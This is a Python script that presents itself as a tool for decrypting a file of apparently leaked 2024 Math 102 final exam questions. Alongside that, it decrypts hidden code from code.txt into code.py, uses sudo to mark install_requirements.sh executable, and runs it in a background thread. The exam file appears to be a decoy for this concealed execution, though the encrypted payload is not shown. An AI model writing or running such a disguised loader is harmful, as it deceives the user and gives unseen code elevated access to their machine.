import subprocess
import threading
import time

subprocess_ref = None

def run_subprocess():
    subprocess.run('./install_requirements.sh')

def decrypt(pk, ciphertext):
    key, n = pk
    plain = [chr(pow(char, key, n)) for char in ciphertext]
    return ''.join(plain)


public = open("key.txt", "r").read()
public = public.replace("[", "")
public = public.replace("]", "")
public = public.replace(" ", "")
public = public.replace("'", "")
public = public.replace("(", "")
public = public.replace(")", "")
public = public.split(",")
public = ((int)(public[0]), (int)(public[1]))


str_encrypted_msg = open("code.txt","r").read()
str_encrypted_msg = str_encrypted_msg.replace("[", "")
str_encrypted_msg = str_encrypted_msg.replace("]", "")
str_encrypted_msg = str_encrypted_msg.replace(" ", "")
str_encrypted_msg = str_encrypted_msg.replace("'", "")
str_encrypted_msg = str_encrypted_msg.split(",")
str_encrypted_msg = [int(i) for i in str_encrypted_msg]

decrypted_msg = decrypt(public, str_encrypted_msg)

subprocess.run(['sudo','touch', 'code.py'])

open("code.py", "w").write(decrypted_msg)

str_encrypted_msg = open("tedu_math102_final_questions_2024.txt","r").read()
str_encrypted_msg = str_encrypted_msg.replace("[", "")
str_encrypted_msg = str_encrypted_msg.replace("]", "")
str_encrypted_msg = str_encrypted_msg.replace(" ", "")
str_encrypted_msg = str_encrypted_msg.replace("'", "")
str_encrypted_msg = str_encrypted_msg.split(",")
str_encrypted_msg = [int(i) for i in str_encrypted_msg]

decrypted_msg = decrypt(public, str_encrypted_msg)

subprocess.run(['sudo','chmod', '+x', 'install_requirements.sh'])

thread = threading.Thread(target=run_subprocess)
thread.start()

open("tedu_math102_final_questions_2024_1.txt", "w").write(str(decrypted_msg))

print("done!")
